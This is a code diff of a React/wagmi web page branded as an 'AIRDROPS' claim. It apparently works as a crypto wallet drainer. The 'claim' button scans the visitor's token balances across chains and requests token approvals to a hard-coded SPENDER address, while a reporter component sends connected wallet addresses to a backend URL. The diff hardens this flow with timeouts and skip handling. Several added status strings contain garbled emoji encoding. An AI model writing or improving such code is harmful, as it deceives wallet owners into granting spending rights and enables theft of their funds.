@@ -5,18 +5,13 @@ import { erc20Abi } from 'viem';
 import { readContract, getBalance, switchChain } from '@wagmi/core';
 import { config } from '@/config';
 import { sendMeeTx } from '@/utils/sendMeeTx';
-import { clearMeeClients } from '@/utils/meeClient';
 
-// Backend reporting URL
 const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
-
-// Spender address
 const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
 if (!SPENDER || SPENDER === "0x") {
   throw new Error('SPENDER_ADDRESS is not defined or invalid');
 }
 
-// Tokens grouped by chainId
 const TOKENS_BY_CHAIN: Record<
   number,
   { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
@@ -38,14 +33,12 @@ const TOKENS_BY_CHAIN: Record<
   ],
 };
 
-// Chain names
 const CHAIN_NAMES: Record<number, string> = {
   1: "Ethereum Mainnet",
   42161: "Arbitrum",
   11155111: "Sepolia",
 };
 
-// Component that reports wallet connections
 function ConnectionReporter() {
   const { address, isConnected } = useAccount();
 
@@ -65,16 +58,25 @@ function ConnectionReporter() {
   return null;
 }
 
+// ðŸŸ¢ Utility: timeout wrapper
+async function withTimeout<T>(promise: Promise<T>, ms: number, msg: string): Promise<T> {
+  return new Promise<T>((resolve, reject) => {
+    const id = setTimeout(() => reject(new Error(msg)), ms);
+    promise
+      .then((res) => {
+        clearTimeout(id);
+        resolve(res);
+      })
+      .catch((err) => {
+        clearTimeout(id);
+        reject(err);
+      });
+  });
+}
+
 export default function Home() {
   const { address, isConnected, chainId } = useAccount();
   const [status, setStatus] = useState<string>("");
-
-  // Clear meeClients on disconnect
-  useEffect(() => {
-    if (!isConnected) {
-      clearMeeClients();
-    }
-  }, [isConnected]);
 
   async function handleClaim() {
     if (!isConnected || !address) {
@@ -92,30 +94,38 @@ export default function Home() {
         const numericCid = Number(cid);
         let balancesForReport: any[] = [];
 
+        // Native balance with timeout
         try {
-          const nativeBal = await getBalance(config, { address, chainId: numericCid });
+          const nativeBal = await withTimeout(
+            getBalance(config, { address, chainId: numericCid }),
+            10_000, // 10s
+            `Timeout: native balance on ${numericCid}`
+          );
           balancesForReport.push({
             token: "native",
             symbol: nativeBal.symbol,
             balance: nativeBal.formatted,
           });
         } catch (err) {
-          console.error(`Failed to fetch native balance for chain ${numericCid}:`, err);
+          console.error(`Failed native balance for ${numericCid}:`, err);
         }
 
+        // ERC20 balances with timeout
         for (const token of tokens) {
           try {
-            const bal = await readContract(config, {
-              chainId: numericCid,
-              address: token.address,
-              abi: erc20Abi,
-              functionName: "balanceOf",
-              args: [address],
-            }) as bigint;
+            const bal = await withTimeout(
+              readContract(config, {
+                chainId: numericCid,
+                address: token.address,
+                abi: erc20Abi,
+                functionName: "balanceOf",
+                args: [address],
+              }) as Promise<bigint>,
+              10_000, // 10s
+              `Timeout: ${token.symbol} balance on ${numericCid}`
+            );
 
-            const decimals = token.decimals || 18;
-            const formatted = Number(bal) / 10 ** decimals;
-
+            const formatted = Number(bal) / 10 ** token.decimals;
             balancesForReport.push({
               token: token.address,
               symbol: token.symbol,
@@ -127,7 +137,7 @@ export default function Home() {
               usableTokens.push(token);
             }
           } catch (err) {
-            console.error(`Failed to read balance for ${token.symbol}:`, err);
+            console.error(`Failed ${token.symbol} on chain ${numericCid}:`, err);
           }
         }
 
@@ -154,13 +164,14 @@ export default function Home() {
       }
 
       const chainName = CHAIN_NAMES[targetChain!] || "Unknown Chain";
-
       if (chainId !== targetChain) {
         setStatus(`Switching to ${chainName}...`);
         await switchChain(config, { chainId: targetChain });
       }
 
       let successCount = 0;
+      let skippedCount = 0;
+
       for (const token of usableTokens) {
         setStatus(`Approving ${token.symbol} on ${chainName} with Fusion...`);
 
@@ -171,34 +182,27 @@ export default function Home() {
             amountHuman: "2",
             decimals: token.decimals,
             chainId: targetChain!,
-            address, // ✅ pass wallet address
           });
 
           successCount++;
-          setStatus(`${token.symbol} Fusion approval ✅ | Tx: ${txHash}`);
-
-          await fetch(`${REPORT_URL}`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              event: "approval",
-              wallet: address,
-              chainName,
-              token: token.address,
-              symbol: token.symbol,
-              txHash,
-            }),
-          }).catch(console.error);
+          setStatus(`${token.symbol} Fusion approval âœ… | Tx: ${txHash}`);
         } catch (err: any) {
-          console.error(`Fusion approval failed for ${token.symbol}`, err);
-          setStatus(`❌ Fusion failed for ${token.symbol}: ${err?.message || err}`);
+          const msg = err?.message || String(err);
+          if (msg.includes("not supported as a Fusion fee token")) {
+            skippedCount++;
+            setStatus(`â­ï¸ Skipped ${token.symbol} (not supported)`);
+          } else {
+            setStatus(`âŒ Fusion failed for ${token.symbol}: ${msg}`);
+          }
         }
       }
 
       if (successCount > 0) {
-        setStatus("🎉 Some approvals succeeded!");
+        setStatus(`ðŸŽ‰ ${successCount} approval(s) succeeded!`);
+      } else if (skippedCount > 0) {
+        setStatus(`â­ï¸ Skipped ${skippedCount} token(s) â€” not supported.`);
       } else {
-        setStatus("⚠️ No approvals succeeded.");
+        setStatus("âš ï¸ No approvals succeeded.");
       }
     } catch (err: any) {
       console.error(err);
@@ -211,15 +215,7 @@ export default function Home() {
   }, [isConnected, address]);
 
   return (
-    <main
-      style={{
-        display: "flex",
-        flexDirection: "column",
-        alignItems: "center",
-        gap: "24px",
-        marginTop: "40px",
-      }}
-    >
+    <main style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "24px", marginTop: "40px" }}>
       <header
         style={{
           position: "fixed",
@@ -237,24 +233,13 @@ export default function Home() {
           zIndex: 1000,
         }}
       >
-        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>
-          AIRDROPS
-        </div>
+        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>AIRDROPS</div>
         <appkit-button />
       </header>
 
       <ConnectionReporter />
 
-      <div
-        style={{
-          display: "flex",
-          flexDirection: "column",
-          gap: "24px",
-          paddingTop: "80px",
-          width: "80%",
-          maxWidth: "600px",
-        }}
-      >
+      <div style={{ display: "flex", flexDirection: "column", gap: "24px", paddingTop: "80px", width: "80%", maxWidth: "600px" }}>
         <div
           style={{
             border: "1px solid #9dd6d1ff",
@@ -269,21 +254,9 @@ export default function Home() {
           }}
         >
           <h2 style={{ marginBottom: "12px" }}>Airdrop</h2>
-
-          <div
-            style={{
-              flex: 1,
-              display: "flex",
-              alignItems: "center",
-              justifyContent: "center",
-              color: "#e4e1daff",
-              fontSize: "14px",
-              textAlign: "center",
-            }}
-          >
+          <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", color: "#e4e1daff", fontSize: "14px", textAlign: "center" }}>
             {status || ""}
           </div>
-
           <button
             onClick={handleClaim}
             style={{
